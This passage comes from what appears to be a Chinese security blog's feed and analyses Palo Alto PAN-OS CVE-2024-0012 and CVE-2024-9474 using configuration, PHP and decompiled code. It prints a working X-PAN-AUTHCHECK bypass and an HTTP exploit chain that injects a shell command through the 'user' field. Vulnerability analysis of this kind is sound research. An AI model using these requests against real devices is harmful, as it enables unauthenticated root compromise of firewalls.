/SAML20/SP/ACS<br>/SAML20/SP/SLO<br>/SAML20/SP/TEST<br>^/(vendor|python)([^\/]*)/(.*).(json|lock|conf)$ =&gt; 404 不允许访问<br>/upload/ =&gt; @upload_regular<br>/upload =&gt; 403<br>/plugins/([^\/]*)/ui/(js|styles|generated|VMSeries_Help|<span class="hljs-built_in">help</span>)/(.*)$ =&gt; /installed/<span class="hljs-variable">$1</span>/ui/<span class="hljs-variable">$2</span>/<span class="hljs-variable">$3</span> =&gt; /opt/plugins<br>/webui/ =&gt; ^/webui(\/.*)$ /php-packages/firewall_webui/php/api/index.php<span class="hljs-variable">$1</span><br>/api/index.php =&gt; <span class="hljs-variable">$args</span>,<span class="hljs-variable">$request</span> 中敏感信息替换为 *， multipart/form-data =&gt; @upload_api<br>/api =&gt; /api/xfdfs =&gt; /apifsdfs 的情况重写 <span class="hljs-variable">$1</span>/index.php<span class="hljs-variable">$2</span><br>/restapi/ =&gt; /api/index.php 类似<br>/restapi-doc =&gt; /restapi-doc/<br>/restapi-doc/ =&gt; include conf/proxy_default.conf 认证生效<br>@upload_api =》 @back_upload_api incinternallude conf/proxy_default.conf 认证生效<br>/error_page/ =》 xxx<br></code></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>php.ini 和 index.php 都表明了先加载 envSetup.php：</p><p>只有 4 个条件都满足后才会进行认证验证：</p><ul><li>$_SERVER[‘HTTP_X_PAN_AUTHCHECK’] !&#x3D; ‘off’</li><li>$_SERVER[‘PHP_SELF’] !&#x3D;&#x3D; ‘&#x2F;CA&#x2F;ocsp’</li><li>$_SERVER[‘PHP_SELF’] !&#x3D;&#x3D; ‘&#x2F;php&#x2F;login.php’</li><li>stristr($_SERVER[‘REMOTE_HOST’], ‘127.0.0.1’) &#x3D;&#x3D;&#x3D; false</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_PAN_AUTHCHECK&#x27;</span>] != <span class="hljs-string">&#x27;off&#x27;</span><br>    &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] !== <span class="hljs-string">&#x27;/CA/ocsp&#x27;</span><br>    &amp;&amp;  <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] !== <span class="hljs-string">&#x27;/php/login.php&#x27;</span><br>    &amp;&amp; <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_HOST&#x27;</span>], <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) === <span class="hljs-literal">false</span><br>) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PAN_SESSION_READONLY&#x27;</span>] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-variable">$ws</span> = <span class="hljs-title class_">WebSession</span>::<span class="hljs-title function_ invoke__">getInstance</span>(<span class="hljs-variable">$ioc</span>);<br>    <span class="hljs-variable">$ws</span>-&gt;<span class="hljs-title function_ invoke__">start</span>();<br>    <span class="hljs-variable">$ws</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    <span class="hljs-comment">// these are horrible hacks.</span><br>    <span class="hljs-comment">// This whole code should be removed and only make available to a few pages: main, debug, etc.</span><br>    <span class="hljs-keyword">if</span> (<br>        !<span class="hljs-title class_">Str</span>::<span class="hljs-title function_ invoke__">startsWith</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&#x27;/php-packages/panorama_webui/php/api/index.php&#x27;</span>)<br>        &amp;&amp; !<span class="hljs-title class_">Str</span>::<span class="hljs-title function_ invoke__">startsWith</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&#x27;/php-packages/firewall_webui/php/api/index.php&#x27;</span>)<br>    ) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Backend</span>::<span class="hljs-title function_ invoke__">quickSessionExpiredCheck</span>()) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])) &#123;<br>                <span class="hljs-title class_">Util</span>::<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title class_">Util</span>::<span class="hljs-title function_ invoke__">login</span>();<br>            &#125;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/image-20250516131149267.png" alt="image-20250516131149267"></p><p>HTTP_X_PAN_AUTHCHECK &#x3D;&gt; Req Header X-PAN-AUTHCHECK</p><p>这里请求的是 Apache 的 WEB 服务：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">28250</span><span class="hljs-regexp">/php/</span>ztp_gate.php -v<br>curl http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">28250</span><span class="hljs-regexp">/php/</span>ztp_gate.php -v -H <span class="hljs-string">&quot;X-PAN-AUTHCHECK: off&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/image-20250516133116566.png" alt="image-20250516133116566"></p><p>可以看到 X-PAN-AUTHCHECK 是可以有效绕过的。</p><p>但是放在 80,443 这些 nginx 的服务端口就不行了。</p><p><img src="/../../images/image-20250516133249006.png" alt="image-20250516133249006"></p><p>这个原因其实在从上面的 nginx 配置分析就可以看出来。除过几个特定的路径设置了 $panAuthCheck ‘off’ 也就是 proxy_default.conf 中的 X-pan-AuthCheck $panAuthCheck 其他的路由在刚开始就被默认配置为 on 了：</p><ul><li>^/unauth/.+$</li><li>&#x2F;php&#x2F;logout.php</li><li>&#x2F;php&#x2F;login.php</li><li>&#x2F;SAML20&#x2F;SP&#x2F;ACS</li><li>xxxx</li></ul><p>不过很明显的是存在漏网之鱼的：</p><p><img src="/../../images/image-20250518005025252.png" alt="image-20250518005025252"></p><p>而自定义的 X-PAN-AUTHCHECK 并不在 nginx 默认的过滤范围之内（ Authorization、下划线…）那么也就是说，客户端自定义的请求头是可以被传递到 apache 的，也就是造成了身份认证绕过。（ 下面那个 &#x2F;unauth 路由的也是，还有个认证绕过的漏洞，这里不讲 ）</p><p><img src="/../../images/image-20250518005410367.png" alt="image-20250518005410367"></p><p>然后还有一个问题，为什么访问 &#x2F;php&#x2F;ztp_gate.php&#x2F;.js.map 会解析 &#x2F;php&#x2F;ztp_gate.php 呢？</p><p>没有找到什么关于的配置，本地测试 apache，nginx 都是可以这样解析的 .php&#x2F;随机字符串</p><p><img src="/../../images/image-20250518011157928.png" alt="image-20250518011157928"></p><p>学到了：</p><p><img src="/../../images/image-20250518011349251.png" alt="image-20250518011349251"></p><p>可以看到解析是始终是 php 文件</p><p><img src="/../../images/image-20250518011529083.png" alt="image-20250518011529083"></p><p>这也解释了为什么会有这种构造了：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">^<span class="hljs-regexp">/webui(\/.*)$ /</span>php-packages<span class="hljs-regexp">/firewall_webui/</span>php<span class="hljs-regexp">/api/i</span>ndex.php<span class="hljs-variable">$1</span><br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/">https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/</a></li><li><a href="https://www.cnblogs.com/xiongzaiqiren/p/16968651.html">https://www.cnblogs.com/xiongzaiqiren/p/16968651.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2024-9474 Palo Alto 权限提升漏洞分析</title>
      <link href="/2025/05/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2024-9474/"/>
      <url>/2025/05/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2024-9474/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：CVE-2024-9474 </p><p>漏洞名称：Palo Alto 权限提升漏洞</p><p>漏洞利用：和 CVE-2024-0012 认证绕过漏洞配合实现权限提升到 ROOT RCE。</p><p>环境搭建参考 CVE-2024-0012 文章中。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞利用分为 2 个步骤：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/php/utils/createRemoteAppwebSession.php/watchTowr.js.map</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>&#123;&#123;Hostname&#125;&#125;<br><span class="hljs-attribute">X-PAN-AUTHCHECK</span><span class="hljs-punctuation">: </span>off<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>107<br><br><span class="language-dts"><span class="hljs-attr">user</span><span class="hljs-operator">=</span>`echo $(uname -a) &gt; <span class="hljs-keyword">/var/</span>appweb<span class="hljs-keyword">/htdocs/</span>unauth/watchTowr.php`<span class="hljs-variable">&amp;</span>userR<span class="hljs-attr">ole</span><span class="hljs-operator">=</span>superuser<span class="hljs-variable">&amp;</span>remoteH<span class="hljs-attr">ost</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;vsys</span>=vsys1</span><br><span class="language-dts"></span><br><span class="language-dts"></span><br><span class="language-dts">GET /index.php/.js.map HTTP/<span class="hljs-number">1.1</span></span><br><span class="language-dts"><span class="hljs-symbol">Host:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span>Hostname<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br><span class="language-dts"><span class="hljs-symbol">Cookie:</span> PHPSESSID=<span class="hljs-number">2</span>qe3kouhjdm8317f6vmueh1m8n<span class="hljs-punctuation">;</span></span><br><span class="language-dts">X-PAN-AUTHCHECK: off</span><br><span class="language-dts"><span class="hljs-symbol">Connection:</span> keep-alive</span><br></code></pre></td></tr></table></figure><p>php&#x2F;utils&#x2F;createRemoteAppwebSession.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title class_">WebSession</span>::<span class="hljs-title function_ invoke__">start</span>();<br><br><span class="hljs-comment">/** <span class="hljs-doctag">@noinspection</span> PhpUndefinedFunctionInspection */</span><br><span class="hljs-variable">$isCms</span> = <span class="hljs-title function_ invoke__">panui_platform_is_cms</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$isCms</span> == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// create a remote appweb session only on a device</span><br>    <span class="hljs-comment">// &#x27;vsys&#x27; is the list of accessible vsys for the user. If blank then it means all vsys</span><br><br>    <span class="hljs-variable">$locale</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;locale&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;locale&#x27;</span>] : <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;locale&#x27;</span>];<br>    <span class="hljs-comment">/** <span class="hljs-doctag">@noinspection</span> PhpUndefinedFunctionInspection */</span><br>    <span class="hljs-title function_ invoke__">panCreateRemoteAppwebSession</span>(<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;userRole&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;remoteHost&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;vsys&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;editShared&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;prot&#x27;</span>],<br>        <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;rbaxml&#x27;</span>],<br>        <span class="hljs-variable">$locale</span>,<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;hideHeaderBg&#x27;</span>]<br>    );<br>&#125;<br><br><span class="hljs-title function_ invoke__">session_write_close</span>();<br></code></pre></td></tr></table></figure><p>主要处理逻辑是 panCreateRemoteAppwebSession，上面注释表示这是 PHP 未定义函数，那么就应该是扩展什么的。</p><p>之前分析过 PHP 配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">include_path</span> = <span class="hljs-string">&quot;.:/var/appweb/htdocs/phpincludes:/usr/lib64/php/modules&quot;</span> <span class="hljs-comment">; PAN-MODIFIED</span><br><span class="hljs-attr">extension_dir</span> = <span class="hljs-string">&quot;/usr/lib64/php/modules&quot;</span> <span class="hljs-comment">; PAN-MODIFIED - likely not needed. it is already working</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tar -czvf php_modules.tar.gz <span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/php/m</span>odules/<br></code></pre></td></tr></table></figure><p>&#x2F;usr&#x2F;lib64&#x2F;php&#x2F;modules 目录中：</p><p><img src="/../../images/image-20250607140326695.png" alt="image-20250607140326695"></p><p>PHP 包装：</p><p><img src="/../../images/image-20250607140422445.png" alt="image-20250607140422445"></p><p><img src="/../../images/image-20250607140447259.png" alt="image-20250607140447259"></p><p>panhttpdmodule.so</p><p><img src="/../../images/image-20250607140501034.png" alt="image-20250607140501034"></p><p>让 AI 帮忙转换为伪代码方便观看逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">panCreateRemoteAppwebSession</span><span class="hljs-params">(</span><br><span class="hljs-params">    user: str,</span><br><span class="hljs-params">    userRole: str,</span><br><span class="hljs-params">    remoteHost: str,</span><br><span class="hljs-params">    accessibleVsys: str,</span><br><span class="hljs-params">    editShared: <span class="hljs-type">bool</span>,</span><br><span class="hljs-params">    protocol: str,</span><br><span class="hljs-params">    serverPort: <span class="hljs-type">int</span>,</span><br><span class="hljs-params">    rbaXml: str,</span><br><span class="hljs-params">    locale: str,</span><br><span class="hljs-params">    hideHeaderBg: <span class="hljs-type">bool</span></span><br><span class="hljs-params">)</span> -&gt; <span class="hljs-type">int</span>:<br>    # 初始化变量和缓冲区<br>    sessionData = allocateMemory(<span class="hljs-number">0x300</span>)<br>    errorBuffer = allocateMemory(<span class="hljs-number">0x2D8</span>)<br>    deviceInfo = &#123;&#125;<br>    vsysNames = []<br>    <br>    # <span class="hljs-number">1.</span> 参数验证<br>    <span class="hljs-keyword">if</span> not user or not userRole or not remoteHost or not accessibleVsys:<br>        printError(<span class="hljs-string">&quot;Required parameters not specified&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>  # 错误代码<br>    <br>    # <span class="hljs-number">2.</span> 远程主机安全检查<br>    clientHost = getServerVar(<span class="hljs-string">&quot;REMOTE_HOST&quot;</span>)<br>    <span class="hljs-keyword">if</span> clientHost and clientHost not in [<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;::1&quot;</span>, <span class="hljs-string">&quot;0:0:0:0:0:0:0:1&quot;</span>]:<br>        <span class="hljs-keyword">if</span> not clientHost.startswith(<span class="hljs-string">&quot;trusted_prefix&quot;</span>):<br>            printError(<span class="hljs-string">&quot;Unauthorized&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <br>    # <span class="hljs-number">3.</span> IP地址处理<br>    <span class="hljs-keyword">if</span> remoteHost.startswith(<span class="hljs-string">&quot;http://&quot;</span>):<br>        ipPart = remoteHost[<span class="hljs-number">7</span>:]  # 去掉<span class="hljs-string">&quot;http://&quot;</span>前缀<br>        <br>        <span class="hljs-keyword">if</span> isIPv6(ipPart):<br>            <span class="hljs-keyword">if</span> not validateIPv6(ipPart):<br>                logDebug(<span class="hljs-string">&quot;Invalid IPv6 address&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> not validateIPv4(ipPart):<br>                logDebug(<span class="hljs-string">&quot;Invalid IPv4 address&quot;</span>)<br>    <br>    # <span class="hljs-number">4.</span> 用户认证<br>    protocolType = getProtocolType(protocol, serverPort)<br>    authResult = authenticateUser(<br>        user=user,<br>        password=<span class="hljs-string">&quot;&quot;</span>,  # 密码可能在其他地方处理<br>        protocol=protocolType,<br>        host=remoteHost,<br>        vsys=accessibleVsys,<br>        sessionData=sessionData<br>    )<br>    <br>    <span class="hljs-keyword">if</span> authResult != <span class="hljs-number">0</span>:<br>        printError(<span class="hljs-string">&quot;Authentication failed&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  # 注意这里返回<span class="hljs-number">0</span>表示错误<br>    <br>    # <span class="hljs-number">5.</span> 创建PHP会话<br>    sessionStart()<br>    sessionSet(<span class="hljs-string">&quot;cmsRemoteSession&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    sessionSet(<span class="hljs-string">&quot;panorama_sessionid&quot;</span>, <span class="hljs-string">&quot;dummy&quot;</span>)  # 硬编码值<br>    sessionSet(<span class="hljs-string">&quot;user&quot;</span>, user)<br>    sessionSet(<span class="hljs-string">&quot;userRole&quot;</span>, userRole)<br>    sessionSet(<span class="hljs-string">&quot;vsys&quot;</span>, accessibleVsys)<br>    sessionSet(<span class="hljs-string">&quot;editShared&quot;</span>, editShared)<br>    <br>    # <span class="hljs-number">6.</span> 获取设备信息<br>    <span class="hljs-keyword">if</span> getDeviceInfo(user, deviceInfo, errorBuffer) == <span class="hljs-number">0</span>:<br>        sessionSet(<span class="hljs-string">&quot;model&quot;</span>, deviceInfo.model)<br>        sessionSet(<span class="hljs-string">&quot;serialNo&quot;</span>, deviceInfo.serial)<br>        sessionSet(<span class="hljs-string">&quot;version&quot;</span>, deviceInfo.version)<br>        sessionSet(<span class="hljs-string">&quot;isCms&quot;</span>, <span class="hljs-string">&quot;no&quot;</span>)<br>        <br>        <span class="hljs-keyword">if</span> locale:<br>            sessionSet(<span class="hljs-string">&quot;locale&quot;</span>, locale)<br>        <span class="hljs-keyword">if</span> hideHeaderBg:<br>            sessionSet(<span class="hljs-string">&quot;hideHeaderBg&quot;</span>, hideHeaderBg)<br>    <br>    # <span class="hljs-number">7.</span> 处理RBAC XML<br>    <span class="hljs-keyword">if</span> rbaXml:<br>        # 清理XML中的换行符<br>        cleanedXml = rbaXml.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)<br>        sessionSet(<span class="hljs-string">&quot;RBA_XML&quot;</span>, cleanedXml)<br>        <br>        <span class="hljs-keyword">if</span> applyRBACFromXml(user, cleanedXml, errorBuffer) != <span class="hljs-number">0</span>:<br>            printError(errorBuffer)<br>            cleanup()<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <br>    # <span class="hljs-number">8.</span> 处理VSYS配置<br>    defaultVsys = <span class="hljs-string">&quot;vsys1&quot;</span><br>    <span class="hljs-keyword">if</span> accessibleVsys:<br>        vsysList = accessibleVsys.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-keyword">if</span> vsysList:<br>            defaultVsys = vsysList[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">else</span>:<br>        # 获取所有可用VSYS<br>        vsysNames = getAllVsysNames(user, <span class="hljs-string">&quot;localhost.localdomain&quot;</span>)<br>        <span class="hljs-keyword">if</span> vsysNames:<br>            defaultVsys = vsysNames[<span class="hljs-number">0</span>]<br>    <br>    # 设置设备和VSYS关联<br>    <span class="hljs-keyword">if</span> setDeviceAndVsysForSession(user, <span class="hljs-string">&quot;localhost.localdomain&quot;</span>, defaultVsys, errorBuffer) != <span class="hljs-number">0</span>:<br>        printError(errorBuffer)<br>        cleanup()<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <br>    # <span class="hljs-number">9.</span> 清理并返回<br>    sessionWriteClose()<br>    freeAuthResources(sessionData)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  # 成功<br></code></pre></td></tr></table></figure><p>主要是经过一系列的验证，然后把 user ( payload ) 存储到 session 的 user 位置。</p><ul><li>远程主机安全检查</li><li>用户认证</li></ul><p>先看看为什么 远程主机安全检查 可以通过，跟进一些获取 REMOTE_HOST 的方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c">v12 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)pan_php_SERVER_get_str((__int64)<span class="hljs-string">&quot;REMOTE_HOST&quot;</span>, <span class="hljs-number">0LL</span>, (__int64)&amp;v48);<br><br>__int64 __fastcall <span class="hljs-title function_">pan_php_SERVER_get_str</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> pan_php_SERVER_get_str(a1, a2);<br>&#125;<br><br>__int64 __fastcall <span class="hljs-title function_">pan_php_SERVER_get_str</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// eax</span><br>  __int64 v5; <span class="hljs-comment">// rdx</span><br>  <br>  v2 = pan_php_get_superglobal((__int64)<span class="hljs-string">&quot;_SERVER&quot;</span>);<br>  v3 = pan_zval_assoc_get_prop(v2, a1);<br>  v4 = pan_zval_to_maybe(v3);<br>  <span class="hljs-keyword">return</span> pan_maybe_str_unwrap_or(v4, v5, a2);<br>&#125;<br><br>__int64 __fastcall <span class="hljs-title function_">pan_php_get_superglobal</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> pan_php_get_superglobal((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)a1);<br>&#125;<br><br>__int64 __fastcall <span class="hljs-title function_">pan_php_get_superglobal</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// r12</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  __int64 v4; <span class="hljs-comment">// rax</span><br><br>  v1 = zend_hash_str_find((__int64)&amp;executor_globals + <span class="hljs-number">304</span>, (__int64)a1, <span class="hljs-built_in">strlen</span>(a1));<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)pan_zval_is_array(v1) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( panui_log_target == 